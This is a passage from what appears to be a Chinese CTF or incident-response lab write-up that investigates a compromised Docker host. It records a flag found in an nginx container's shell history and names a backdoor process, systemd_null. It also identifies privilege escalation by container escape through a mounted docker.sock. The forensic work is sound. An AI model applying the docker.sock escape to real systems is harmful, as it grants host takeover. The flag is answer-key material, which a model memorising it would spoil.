逐个排查其他容器，首先进入网页代理nginx的容器中

`docker exec -it my-nginx bash`

![image-20250528201928321](posts/6213db3a/images/linux_4_1_dockerHistory.webp)

进入容器第一步，查看history发现第二个flag

> zgsf{yerhawtigouhegih}

### 后门进程名称

这里的后门就是前面发现的[systemd_null](# 这里的systemd_null丢给沙箱竟然分析不出来，把这个和history中的反弹shell命令丢给ai，ai告诉我们这是起一个web服务器，服务器的服务就是RCE)

### 攻击者的提权方式

这里攻击者的提权方式docker容器逃逸漏洞中的基于危险挂载逃逸[后渗透——Docker容器逃逸-CSDN博客](https://blog.csdn.net/qq_43531669/article/details/145325152)

题目要我们给程序名，回到thinkphp容器，模糊查询sock

![image-20250528203031837](posts/6213db3a/images/linux_4_1_dockerSock.webp)

找到提权方式docker.sock



最后提交：

![image-20250528203414574](posts/6213db3a/images/linux_4_1_answer.webp)